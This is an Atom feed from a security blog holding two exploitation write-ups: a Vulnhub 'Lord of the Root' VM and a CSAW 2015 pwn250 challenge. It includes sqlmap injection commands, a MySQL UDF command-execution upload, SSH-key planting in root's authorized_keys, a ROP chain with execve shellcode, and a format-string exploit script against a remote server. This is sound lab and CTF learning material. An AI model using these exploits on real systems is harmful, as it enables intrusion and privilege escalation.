<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Binary | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/binary/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-10-04T11:23:41+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Lord of the Root]]></title>
    <link href="http://barrebas.github.io/blog/2015/10/04/lord-of-the-root/"/>
    <updated>2015-10-04T10:02:33+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/10/04/lord-of-the-root</id>
    <content type="html"><![CDATA[<p>I figured I&rsquo;d try another VM from Vulnhub for a change. This is Lord of the Root v1.0.1.</p>

<!--more-->


<p><em>Note</em>: Before I could even start the VM with Virtualbox, I had to unpack the .ova, delete the .mf file and remove xml entries from the .ovf file.</p>

<p>The first portscan yielded only ssh as an open port. Upon connecting we get this banner:</p>

<pre><code class="bash">$ ssh root@192.168.56.101

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
root@192.168.56.101's password:
</code></pre>

<p>&ldquo;Knock Friend to Enter&rdquo; and &ldquo;Easy as 1,2,3&rdquo; so that has to be port-knocking. I tried to &ldquo;knock&rdquo; with <code>nc</code>, but that didn&rsquo;t work. I hoped the sequence was indeed 1,2,3 so I just used nmap to do it:</p>

<pre><code class="bash">$ nmap -n -T4 -sV -Pn -r 192.168.56.101 -p1,2,3

Starting Nmap 6.00 ( http://nmap.org ) at 2015-10-04 10:15 CEST
Nmap scan report for 192.168.56.101
Host is up.
PORT  STATE    SERVICE     VERSION
1/tcp filtered tcpmux
2/tcp filtered compressnet
3/tcp filtered compressnet
</code></pre>

<p>And after this, port 1337 was open:</p>

<pre><code class="bash">1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
</code></pre>

<p>It&rsquo;s a webserver that serves a single page. I tried to view robots.txt but was given another picture (two hipster hobbits or something). However, the page source contained <code>&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;</code>. Let&rsquo;s decode that base64:</p>

<pre><code class="bash">$ echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' |base64 -d
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
$ echo 'Lzk3ODM0NTIxMC9pbmRleC5waHA=' |base64 -d
/978345210/index.php
</code></pre>

<p>OK so I browsed to that location. It&rsquo;s a login page that is vulnerable to SQLi. I had a hard time finding and exploiting it, because I made a silly mistake. I dumped the database I needed, finally, with this command:</p>

<pre><code class="bash">$ python ./sqlmap.py -u "http://192.168.56.101:1337/978345210/index.php" --data="username=bleh&amp;password=d&amp;submit= Login " --risk 3 --level 3 --dump -D Webapp -t password --dbms=mysql
</code></pre>

<p>In first instance, however, I only used <code>--data "username=bleh&amp;password=d</code>, which prevented SQLmap from finding the SQLi. Note to future self: <em>always</em> include <em>all</em> form parameters!</p>

<p>Anyway, dumping all the data from the db took too long because it was blind SQLi so I just dumped <code>Webapp</code> once I found the database names. Long live SQLmap! This database contained usernames based on Lord of the Rings. I tried logging in to the webpage but couldn&rsquo;t find anything interesting. I tried the five usernames against ssh and struck gold with <code>smeagol:MyPreciousR00t</code>.</p>

<p>From here, there were two ways to root the box: one via a suid binary, one via <code>mysql</code>. I&rsquo;ll start with the SQL route.</p>

<h2>Root via mysql</h2>

<p><code>mysql</code> is running as root:</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ ps aux |grep sql
root      1085  2.0  4.2 318220 43072 ?        Ssl  04:07   0:26 /usr/sbin/mysqld
</code></pre>

<p>That&rsquo;s really nice. I grabbed the login from the web source:</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ cat /var/www/978345210/login.php 
&lt;?php
session_start(); // Starting Session
$error=''; // Variable To Store Error Message
if (isset($_POST['submit'])) {
    if (empty($_POST['username']) || empty($_POST['password'])) {
        $error = "Username or Password is invalid";
    }
    else
    {
        // Define $username and $password
        $username=$_POST['username'];
        $password=$_POST['password'];
        $db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');

        // To protect MySQL injection for Security purpose
        $username = stripslashes($username);
        $password = stripslashes($password);

        $sql="select username, password from Users where username='".$username."' AND password='".$password."';";
        //echo $sql;
                $query = $db-&gt;query($sql);
                $rows = $query-&gt;num_rows;

        if ($rows == 1) {
            $_SESSION['login_user']=$username; // Initializing Session
            header("location: profile.php"); // Redirecting To Other Page
        } else {
            $error = "Username or Password is invalid";
        }
    }
}
?&gt;
</code></pre>

<p>We can now login to <code>mysql</code> as root and upload <code>lib_mysqludf_sys</code> to enable command execution. I ripped parts from my <a href="https://barrebas.github.io/blog/2014/11/03/we-need-to-go-deeper-kvasir-writeup/">Kvasir</a> writeup. I cloned the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys</a> repo and ran the following commands:</p>

<pre><code class="bash">echo "SELECT 0x" &gt; payload
cat lib_mysqludf_sys.so |xxd -p &gt;&gt; payload
echo " INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exploit.so'; " &gt;&gt; payload
</code></pre>

<p><code>payload</code> was ran through <code>tr -d '\n'</code> to remove newlines and the output of that command was entered into the mysql prompt. This creates the <code>udf_exploit.so</code> file on the remote box. From there, I ran:</p>

<pre><code class="bash">mysql&gt; CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_exploit.so'; 
Query OK, 0 rows affected (0.00 sec)
</code></pre>

<p>I created ssh keys for this joyous occasion and upload the public key to the root directory:</p>

<pre><code class="bash">mysql&gt; SELECT "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhzEQ1uE0pjtDVHQZg17PP1rihY0ju7u0fBSJax/oAfxWXia9e229BpW+P6U08zEE4FhnhKdy4Tqyz8sdqwiPFldi8MkzA68oWBP5QwwGBF+CGrsQ7b8CLDSESPOKMx8uTz71OJObHRzC6Vtuhe9CD3unoTw5i1XNRq/Hl3Zm/BaYQB9yQMA6FoE7qt8UhZS1uis9EsNGvUSvYdrRUM7XiWEsml6Q9EGFs0jVZn/UGCr4rD/t0yqNtAKtH+9j2GRbh2pKTynfFXuHTzzODtiHzbEfmO/ma4B2gcyEzj+FBHxhwZAWQ349Fy/m1oDUJsbnk+tlLbdbPoDOTeS1nOAzD" INTO OUTFILE '/root/.ssh/autorized_keys';
Query OK, 1 row affected (0.00 sec)

mysql&gt; SELECT sys_exec("chmod 600 /root/.ssh/authorized_keys");
+--------------------------------------------------+
| sys_exec("chmod 600 /root/.ssh/authorized_keys") |
+--------------------------------------------------+
|                                                0 |
+--------------------------------------------------+
1 row in set (0.02 sec)
</code></pre>

<p>Now I could ssh in as root:</p>

<pre><code class="bash">$ ssh root@192.168.56.101 -i ./rootkey

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)

 * Documentation:  https://help.ubuntu.com/

                            .____    _____________________________                              
                            |    |   \_____  \__    ___/\______   \                             
                            |    |    /   |   \|    |    |       _/                             
                            |    |___/    |    \    |    |    |   \                             
                            |_______ \_______  /____|    |____|_  /                             
                                    \/       \/                 \/                              
 __      __       .__                                ___________      .__                   .___
/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | 
 \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | 
  \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  \___  /   |__|  |__|\___  &gt;___|  /\____ | 
       \/       \/          \/            \/     \/       \/                  \/     \/      \/ 
Last login: Sun Oct  4 04:38:51 2015 from 192.168.56.1
root@LordOfTheRoot:~# 
</code></pre>

<p>So that&rsquo;s the <code>mysql</code> route. Now on to the binary!</p>

<h2>Vulnerable binary</h2>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ find / -perm -4000 -type f 2&gt;/dev/null
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/bin/ping6
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
</code></pre>

<p>Ah, interesting. This reminds me of knock-knock.</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ md5sum /SECRET/door*/file
f0c663095117d908e16412570d2c6252  /SECRET/door1/file
f0c663095117d908e16412570d2c6252  /SECRET/door2/file
bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door3/file
</code></pre>

<p>I grabbed <code>door3</code> and started analysing it on my local box. It contains a <code>strcpy</code> that allows us to control EIP.</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ objdump -d -M intel --no-show-raw-insn /SECRET/door3/file |less

0804845d &lt;main&gt;:
 804845d:       push   ebp
 804845e:       mov    ebp,esp
 8048460:       and    esp,0xfffffff0
 8048463:       sub    esp,0xb0
 8048469:       cmp    DWORD PTR [ebp+0x8],0x1
 804846d:       jg     8048490 &lt;main+0x33&gt;
 804846f:       mov    eax,DWORD PTR [ebp+0xc]
 8048472:       mov    eax,DWORD PTR [eax]
 8048474:       mov    DWORD PTR [esp+0x4],eax
 8048478:       mov    DWORD PTR [esp],0x8048540
 804847f:       call   8048310 &lt;printf@plt&gt;
 8048484:       mov    DWORD PTR [esp],0x0
 804848b:       call   8048340 &lt;exit@plt&gt;
 8048490:       mov    eax,DWORD PTR [ebp+0xc]
 8048493:       add    eax,0x4
 8048496:       mov    eax,DWORD PTR [eax]
 8048498:       mov    DWORD PTR [esp+0x4],eax
 804849c:       lea    eax,[esp+0x11]
 80484a0:       mov    DWORD PTR [esp],eax
 80484a3:       call   8048320 &lt;strcpy@plt&gt;
 80484a8:       mov    eax,0x0
 80484ad:       leave  
 80484ae:       ret    
 80484af:       nop
</code></pre>

<p>I quickly found that I had to run the binary with the first argument containing 171 chars + EIP to overwrite the saved return address on the stack. Let&rsquo;s see how we can spawn a shell&hellip;</p>

<pre><code class="bash">$ gdb -q ./door3
Reading symbols from /home/bas/downloads/LotR/door3...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></pre>

<p>Okay, so no protections whatsoever. We could place shellcode on the stack and pwn like it&rsquo;s 1999.</p>

<pre><code class="bash">gdb-peda$ r $(python -c 'print "A"*171+"BBBBCCCC"')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fbeff4 --&gt; 0x15fd7c 
ECX: 0x0 
EDX: 0xb4 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd530 ("CCCC")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd530 ("CCCC")
0004| 0xffffd534 --&gt; 0xffffd500 ('A' &lt;repeats 44 times&gt;, "BBBBCCCC")
0008| 0xffffd538 --&gt; 0xffffd5e0 --&gt; 0xffffd7e5 ("ORBIT_SOCKETDIR=/tmp/orbit-bas")
0012| 0xffffd53c --&gt; 0xf7fde860 --&gt; 0xf7e5f000 --&gt; 0x464c457f 
0016| 0xffffd540 --&gt; 0xf7ff4821 (mov    eax,DWORD PTR [ebp-0x10])
0020| 0xffffd544 --&gt; 0xffffffff 
0024| 0xffffd548 --&gt; 0xf7ffcff4 --&gt; 0x1cf2c 
0028| 0xffffd54c --&gt; 0x8048249 ("__libc_start_main")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
</code></pre>

<p>Let&rsquo;s just jump to the stack! However, there is no <code>jmp esp</code> opcode in the binary, so it looks like we have a problem. ASLR <em>is</em> enabled on the remote box and none of the registers point directly to the &ldquo;shellcode&rdquo; on the stack. We can hardcode the stack address but that will lead to lots of failed attempts. Let&rsquo;s be smart about this.</p>

<p>Verify no <code>jmp esp</code>:</p>

<pre><code class="bash">gdb-peda$ asmsearch "jmp esp"
Searching for ASM code: 'jmp esp' in: binary ranges
0x08048365 : (83e4) and    esp,0xfffffff0
0x08048460 : (83e4) and    esp,0xfffffff0
0x08048c1b : (00e4) add    ah,ah
0x08049365 : (83e4) and    esp,0xfffffff0
0x08049460 : (83e4) and    esp,0xfffffff0
gdb-peda$ asmsearch "call esp"
Searching for ASM code: 'call esp' in: binary ranges
0x0804864f : (00d4) add    ah,dl
0x08048a6f : (00d4) add    ah,dl
0x08048a73 : (08d4) or     ah,dl
0x08048e0f : (00d4) add    ah,dl
0x0804964f : (00d4) add    ah,dl
gdb-peda$ find "\xff\xd4" binary
Searching for '\xff\xd4' in: binary ranges
Not found
gdb-peda$ find "\xff\xe4" binary
Searching for '\xff\xe4' in: binary ranges
Not found
</code></pre>

<p>However, we do have <code>strcpy</code> and this memory region:</p>

<pre><code class="bash">gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x08049000 r-xp  /home/bas/downloads/LotR/door3
0x08049000 0x0804a000 rwxp  /home/bas/downloads/LotR/door3
</code></pre>

<p><code>0x08049000</code> is <code>rwx</code>! We can now use <code>strcpy</code> to write <code>ff e4</code> to memory and return to it, which bypasses ASLR because the binary is always loaded on the same address. Let&rsquo;s ROP this! <code>strcpy@plt</code> is at 0x8048320 but we can&rsquo;t use that address because it contains a space. We&rsquo;ll just use strcpy+6, which jumps to the resolver to resolve strcpy.</p>

<pre><code class="bash">gdb-peda$ x/4i 0x8048320
   0x8048320 &lt;strcpy@plt&gt;:  jmp    DWORD PTR ds:0x8049740
   0x8048326 &lt;strcpy@plt+6&gt;:    push   0x8
   0x804832b &lt;strcpy@plt+11&gt;:   jmp    0x8048300
   0x8048330 &lt;__gmon_start__@plt&gt;:  jmp    DWORD PTR ds:0x8049744
</code></pre>

<p>With that out of the way, we need a pop2ret to balance the stack. This is easily located with gdb-peda&rsquo;s <code>ropgadget</code> command and I chose 0x804850e. Last thing I needed was the address of the bytes <code>0xff</code> and <code>0xe4</code> and again gdb-peda provided those. Putting the ROP chain together:</p>

<pre><code class="python">import struct
def p(x):
    return struct.pack('&lt;L', x)

def write(what, where):
    # strcpy(dest, src)
    # use strcpy+6 otherwise the address will contain a space, messes up argv
    # second address is pop2ret
    return p(0x8048326)+p(0x804850e)+p(where)+p(what)

z = ""
z += "A"*171
z += write(0x804852c, 0x8049330) # ff
z += write(0x8048366, 0x8049331) # e4 jmp esp
z += p(0x8049330)
# modified /bin/ash shellcode: http://shell-storm.org/shellcode/files/shellcode-547.php
z += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68"
z += "\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24"
z += "\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd"
z += "\x80\x31\xc0\xb0\x01\xcd\x80"
</code></pre>

<p>Death to nopsleds!</p>

<pre><code class="bash">smeagol@LordOfTheRoot:~$ md5sum /SECRET/door*/file
f0c663095117d908e16412570d2c6252  /SECRET/door1/file
bb0e0e4439b5039e71405f8a1b6d5c0c  /SECRET/door2/file
f0c663095117d908e16412570d2c6252  /SECRET/door3/file
smeagol@LordOfTheRoot:~$ /SECRET/door2/file $(python poc.py)
# whoami
root
# id
uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
# 
</code></pre>

<p>And there you go. A reliable way to spawn a root shell from that vulnerable binary. Game over.</p>

<pre><code class="bash"># cat /root/Flag*
"There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power."
â€“ Gandalf
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW 2015 - Pwn250]]></title>
    <link href="http://barrebas.github.io/blog/2015/09/22/csaw-2015-pwn250/"/>
    <updated>2015-09-22T23:00:00+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/09/22/csaw-2015-pwn250</id>
    <content type="html"><![CDATA[<p>This CTF marked our team&rsquo;s anniversary! We managed to pop this pwnable.</p>

<!--more-->


<p>We&rsquo;re given a 32-bit ELF binary, which uses malloc() and free(). Must be some kind of heap vulnerability then, right?</p>

<p>The binary is some kind of contact storage. We can enter names, phone numbers and descriptions. The name gets stored in the .bss segment, while the phone number and description are stored on the heap. We can overflow the name field like so:</p>

<pre><code>Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 1
Contact info: 
    Name: BARREBAS
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 0  
    Length of description: 100       
    Enter description:
        BLEH
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 4
Contacts:
    Name: BARREBAS
    Length 100
    Phone #: 0
    Description: BLEH
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 3
Name to change? BARREBAS
1.Change name
2.Change description
&gt;&gt;&gt; 1
New name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 4
Contacts:
    Name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
    Length 1111638594
    Phone #: 0
    Description: BLEH
</code></pre>

<p>So suppose the struct looked something like</p>

<pre><code class="c">struct {
    char *phoneNumber;  // malloc'ed
    char *description;  // malloc'ed
    char name[64];
    int descriptionLength;
    int valid;
} info_t;
</code></pre>

<p>We can use this to leak information by overwriting the <strong>next</strong> struct&rsquo;s <em>phoneNumber</em> and <em>description</em>. We cannot use this to write anything, as the program will automatically call free() on the description. If it doesn&rsquo;t contain a valid heap address, the binary will crash. First, we&rsquo;ll abuse the leak to determine the remote libc version.</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
      buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def leak(x):
    print "leaking " + hex(x)
    global last_addr
    # edit contact 1 -&gt; name to overflow pointers
    sendln('3')
    readtil('change? ')
    if last_addr == 0:
        sendln('BAR1')
    else:
        sendln('B'*63)

    readtil('&gt;&gt;&gt; ')
    sendln('1')
    readtil('name:')
    #       name          length valid  char *description // char *phone==leak-&gt;malloc@got  
    sendln('B'*63+"\x00"+"BBBB"+p(0)+p(x)+p(x)+"BAR2")
    last_addr = x

    readtil('&gt;&gt;&gt; ')

    sendln('4')
    data = readtil('&gt;&gt;&gt; ')
    m = re.findall('Phone #: (.*)', data)
    return m[0]

def leak4(x):
    return struct.unpack('I', leak(x)[0:4])[0]

def pwn():
    global s
    global last_addr
    last_addr = 0
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('127.0.0.1', 4444))
    s.connect(('54.165.223.128', 2555))
    readtil('&gt;&gt;&gt; ')

    # create contact 1
    sendln('1')
    readtil('Name: ')
    sendln('BAR1')
    readtil('Phone No: ')
    sendln('0')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLEH')

    readtil('&gt;&gt;&gt; ')

    # create contact 2
    sendln('1')
    readtil('Name: ')
    sendln('BAR2')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')

    readtil('&gt;&gt;&gt; ')

    malloc = leak4(0x804b020)
    print "[+] malloc @ " + hex(malloc)
    puts = leak4(0x804b024)
    print "[+] puts   @ " + hex(puts)
</code></pre>

<p>This gave us two addresses, and <a href="http://libcdb.com/">libcdb.com</a> gave us no less than five options. We logged back into the server for pwn100, which had a different IP address so was probably a differnent box. We figured that the CTF organizers used the same base image for each box. The symbols of the libc on pwn100&rsquo;s box seemed to match what we found via the leak and we just got the address of system from that machine.</p>

<p>Now, we needed a way to write to the got. Turns out there was another format string vulnerability in the description field:</p>

<pre><code>Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 1
Contact info: 
    Name: BAR1
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 0
    Length of description: 100
    Enter description:
        %X-%X-%X-%X-%X-%X
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 4
Contacts:
    Name: BAR1
    Length 100
    Phone #: 0
    Description: 9B24008-F77724E0-F7771FF4-0-0-FFDE40D8
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt;
</code></pre>

<p>We used the same trick as in <a href="https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-echoes/">ekoparty&rsquo;s echoes binary</a>, selecting a stack address (actually a saved stack frame pointer) which points to another stack address, which we can then use to write out an address on the stack. Finally, use that third format string argument to write anything anywhere.</p>

<p>We then use the leak to determine libc&rsquo;s base address, add the offset for system, and finally overwrite memset@got with system. Then, once we delete an element with name <code>/bin/sh</code>, we in fact call <code>system('/bin/sh')</code> and we win.</p>

<p>Without further ado:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
      buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)


def write(x, i):
    # first, leak address to which we'll write ($30) so that we can align the writes to $30
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('ZZZZ%18$.08xBBBB')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    data = readtil('&gt;&gt;&gt; ')
    m = re.findall('ZZZZ(.*)BBBB', data)

    addr = m[0].decode('hex')
    addr = struct.unpack('&gt;I', addr)[0]
    start = addr &amp; 0xff

# setup $30 to x (addr to write) via $18 by first setting $6-&gt;$18
#-----------
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start+1) + 'c%6$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ') 

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x &gt;&gt; 8) &amp; 0xff)+'c%18$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')
#-----------
#-----------
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start+2) + 'c%6$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x &gt;&gt; 16) &amp; 0xff)+'c%18$hhn')
#   readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')
#-----------
#-----------
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start+3) + 'c%6$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x &gt;&gt; 24) &amp; 0xff)+'c%18$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')
#-----------

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start) + 'c%6$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(x &amp; 0xff)+'c%18$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

# start writing bytes       
#---write first byte
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(i &amp; 0xff) + 'c%30$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')


    sendln('3')
    readtil('change?')
    sendln('BAR4')
    readtil('&gt;&gt;&gt;')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x+1) &amp; 0xff)+'c%18$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((i &gt;&gt; 8) &amp; 0xff) + 'c%30$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x+2) &amp; 0xff)+'c%18$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((i &gt;&gt; 16) &amp; 0xff) + 'c%30$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x+3) &amp; 0xff)+'c%18$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((i &gt;&gt; 24) &amp; 0xff) + 'c%30$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
